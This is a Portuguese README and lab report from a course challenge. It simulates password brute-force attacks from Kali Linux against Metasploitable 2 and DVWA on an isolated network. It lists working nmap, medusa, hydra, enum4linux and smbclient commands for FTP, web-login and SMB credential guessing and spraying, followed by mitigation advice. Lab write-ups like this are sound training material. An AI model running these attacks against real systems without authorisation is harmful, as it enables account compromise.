# Readme
Simulação de Ataque de Força Bruta com Medusa e Kali Linux

# Relatório do Projeto — Kali + Medusa (Força Bruta)

*Autor:** Hernane Bini  
*Projeto:** Desafio DIO — Kali Linux + Medusa com Metasploitable 2 / DVWA  
*Link: https://1drv.ms/f/c/4cdb45b66d93d79a/Evv83TaUIlFKsC0XvpeY4WgBMMIydRXgZw6nZlrTAmN0aw?e=AMC082 
*Data:** 2025-10-06

---

## 1) Resposta direta — O que entrego
Este repositório contém:
- Scripts automatizados (`scripts/`, `scripts_commented/`)
- Wordlists (`wordlists/`)
- Relatório (este arquivo)
- Slides (`slides/apresentacao_dio.pptx`)
- Evidências (colocar em `images/`)
- Logs (gerados em `scans/`)

---

## 2) Ambiente e Arquitetura
- VirtualBox: Host-Only network
  - Kali (atacante): 192.168.56.101
  - Metasploitable2 (alvo): 192.168.56.102
- Rede isolada entre host e VMs.

---

## 3) Ferramentas utilizadas
- medusa, hydra, nmap, enum4linux, smbclient, curl, ncftp
- Metasploitable 2 / DVWA (alvo vulnerável)
- Scripts bash e slides PPTX

---

## 4) Passo-a-passo auditável (comandos e justificativa)

### 4.1 Preparação
```bash
# configurar IPs e testar conectividade
sudo ip addr add 192.168.56.101/24 dev eth0
ping -c 3 192.168.56.102

4.2 Reconhecimento
bash
Copiar código
nmap -sS -Pn -T4 192.168.56.102 -oN scans/nmap_quick.txt
nmap -sV -p- 192.168.56.102 -oN scans/nmap_full.txt

4.3 Força bruta FTP (Medusa)
bash
Copiar código
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords-small.txt -M ftp -t 10 -f | tee scans/medusa_ftp.log

4.4 Força bruta DVWA (Hydra)
bash
Copiar código
hydra -l admin -P wordlists/passwords-small.txt 192.168.56.102 http-post-form \
"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=COLOQUE_AQUI;security=low" \
| tee scans/hydra_dvwa.log

4.5 Enumeração SMB e Spraying
bash
Copiar código
enum4linux -a 192.168.56.102 | tee scans/enum4linux.txt
smbclient -L //192.168.56.102 -N | tee scans/smbclient_shares.txt
medusa -h 192.168.56.102 -U wordlists/users_spray.txt -P wordlists/passwords-spray.txt -M smbnt -t 10 -f | tee scans/medusa_smb_spray.log

5) Wordlists & Scripts (localização)
wordlists/ (users.txt, passwords-small.txt, users_spray.txt, passwords-spray.txt)

scripts/ (run_medusa_ftp.sh, run_hydra_dvwa.sh, enum_smb.sh, run_medusa_smb_spray.sh)

scripts_commented/ (versões anotadas)

6) Evidências
Link: https://1drv.ms/f/c/4cdb45b66d93d79a/Evv83TaUIlFKsC0XvpeY4WgBMMIydRXgZw6nZlrTAmN0aw?e=AMC082

images/virtualbox_network.png

images/ip_kali.png

images/ip_metasploitable.png

images/nmap_output.png

images/medusa_result.png

images/hydra_result.png

images/enum4linux_result.png

images/smbclient_result.png

Inclua as imagens no relatório com:

markdown
Copiar código
![Descrição da evidência](../images/nome_imagem.png)

7) Resultados
Linha de log (Medusa):

css
Copiar código
[+] 192.168.56.102:21 - msfadmin:msfadmin - LOGIN SUCCESSFUL

8) Recomendações de mitigação
Senhas fortes (mín. 12 caracteres)

MFA/2FA

Rate-limiting / lockout

Substituir FTP por SFTP/FTPS

Desativar SMBv1 / aplicar ACLs

Monitoramento e SIEM / IDS

9) Perspectivas alternativas e próximas etapas
Comparar Medusa x Hydra x Patator

Criar wordlists customizadas (crunch)

Integrar detecção (Suricata + ELK)

Transformar em material EAD com slides e vídeo

10) Checklist final (para submissão)
 Relatório final em docs/

 Slides atualizados em slides/

 Evidências reais em images/

 Scripts no scripts/ e scripts_commented/

 .gitignore e LICENSE adicionados

 Commit e push no GitHub

Aviso:

Lembrando que este é um exemplo e teste educacional, não deve ser usado sem autorização ou fora de um ambiente educional e controlado.
